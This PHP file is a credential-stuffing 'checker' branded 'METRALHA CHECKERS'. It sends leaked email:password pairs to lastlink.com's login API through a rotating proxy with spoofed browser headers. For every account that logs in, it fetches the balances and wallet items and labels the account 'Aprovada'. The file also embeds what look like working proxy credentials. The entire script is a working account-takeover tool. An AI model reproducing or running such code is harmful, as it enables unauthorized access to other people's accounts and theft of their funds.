<?php



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================

    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
    function novoBypass($length = 16) {
    $characters = '66c4aacab43222d7';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$contador = strlen($lista);

if ($contador < 8){

    die(json_encode(array("Error" => "Invalido, o conteudo informado esta devidamente incorrreto.")));
    
}

$metralhagostoso = substr($lista, 0, 8);

if (($metralhagostoso == 'Aprovada') or ($metralhagostoso == 'Aprovado')!== false) {

    die(json_encode(array("Error" => "Vai se foder kkkkkkk.", "Mensagemdometralha" => "Aqui nao amador...!")));

}



function reteste() {
$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", ""), $lista)[0];
$senha = multiexplode(array(":", "|", ""), $lista)[1];


$link_reteste = 'https://lastlink.com/api/dashboard/auth/signin-member';

$post_reteste = '{"email":"'.$email.'","password":"'.$senha.'"}';

$headers_reteste = array (

'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://lastlink.com',
'referer: https://lastlink.com/app/login?redirectTo=https:%2F%2Flastlink.com%2Fapp%2Fcreator%2F',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_reteste);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "lyljrywb-rotate:x4xo3teug5mq");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_reteste);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_reteste);
$reteste = curl_exec($ini);


$retorno_reteste = metraiapuxar($reteste, '"message":"','"', 1);


if (empty($retorno_reteste)!== false ) {

    $av_reteste = "Falha N/A - Resultados.";

} else {


    $av_reteste = ''.$retorno_reteste.'';

}



if (strpos($reteste, 'fields')!== false ) {


   echo "<span class='badge badge-warning'>#RETESTE</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $av_reteste  <br>";


} else if (empty($reteste)!== false ) {


    echo "<span class='badge badge-warning'>#RETESTE</span> $email|$senha <span class='badge badge-info'>Retorno:</span> N/A - Resultados.  <br>";


} else if (strpos($reteste, 'Service Temporarily Unavailable')!== false ) {


   echo "<span class='badge badge-warning'>#RETESTE</span> $email|$senha <span class='badge badge-info'>Retorno:</span> Nao foi possivel, realizar o reteste.  <br>";


}

else {


    echo "<span class='badge badge-success'>#RETESTE</span> $email|$senha  <span class='badge badge-info'>RETORNO:</span> Autenticado repasse no checker para obter resultados. <br>";

 
}
}




$metraialinklogin = 'https://lastlink.com/api/dashboard/auth/signin-member';

$metraia_postfield = '{"email":"'.$email.'","password":"'.$senha.'"}';

$headers_metraia = array (

'accept: application/json, text/plain, */*',
'content-type: application/json',
'origin: https://lastlink.com',
'referer: https://lastlink.com/app/login?redirectTo=https:%2F%2Flastlink.com%2Fapp%2Fcreator%2F',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $metraialinklogin);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "lyljrywb-rotate:x4xo3teug5mq");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_metraia);
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_postfield);
$resposta = curl_exec($ini);
$bearrer = metraiapuxar($resposta, '"','"', 1);
//$jaison = json_decode(curl_exec($ini), true);



$link_balance = 'https://lastlink.com/api/dashboard/creator/get-balance';

$headers_balance = array (

'accept: application/json, text/plain, */*',
'authorization: Bearer '.$bearrer.'',
'referer: https://lastlink.com/app/creator/dashboard-v2',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_balance);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "lyljrywb-rotate:x4xo3teug5mq");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "GET");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_balance);
$balance = curl_exec($ini);



$link_items = 'https://lastlink.com/api/dashboard/creator/wallet/list';

$headers_items = array (

'accept: application/json, text/plain, */*',
'authorization: Bearer '.$bearrer.'',
'referer: https://lastlink.com/app/creator/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_items);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "lyljrywb-rotate:x4xo3teug5mq");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_POST, "GET");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers_items);
 $items = curl_exec($ini);




$saldo_bruto = metraiapuxar($balance, '"receivableBalance":',',', 1);
$saldo_afiliation = metraiapuxar($balance, '"receivableBalanceAffiliate":',',', 1);



$items_wallets = metraiapuxar($items, '"items":[',']}', 1);



$retorno = metraiapuxar($resposta, '"message":"','"', 1);



if (empty($saldo_bruto)!== false ) {

    $av_saldo = "Falha N/A - Resultados.";

} else {


    $av_saldo = ''.$saldo_bruto.'';

}


if (empty($saldo_afiliation)!== false ) {

    $av_afiliation = "Falha N/A - Resultados.";

} else {


    $av_afiliation = ''.$saldo_afiliation.'';

}


if (empty($items_wallets)!== false ) {

    $av_wallets = "Falha N/A - Items wallets.";

} else {


    $av_wallets = ''.$items_wallets.'';

}



if (empty($retorno)!== false ) {

    $av_retorno = "Falha N/A - Resultados.";

} else {


    $av_retorno = ''.$retorno.'';

}





// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//
         

if (strpos($resposta, 'fields')!== false ) {


   echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $av_retorno  <br>";


} else if (empty($resposta)!== false ) {


    echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> N/A - Resultados.  <br>";


} else if (strpos($resposta, 'Service Temporarily Unavailable')!== false ) {

   echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> Erro na request, retestando a cc..  <br>";

   reteste();

}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>RETORNO:</span> Autenticado. <span class='badge badge-primary'>SALDO:</span> $av_saldo <span class='badge badge-primary'>SALDO AFILIATION:</span> $av_afiliation  <span class='badge badge-primary'>ITEMS:</span> $av_wallets   <br>";

 
}
?>
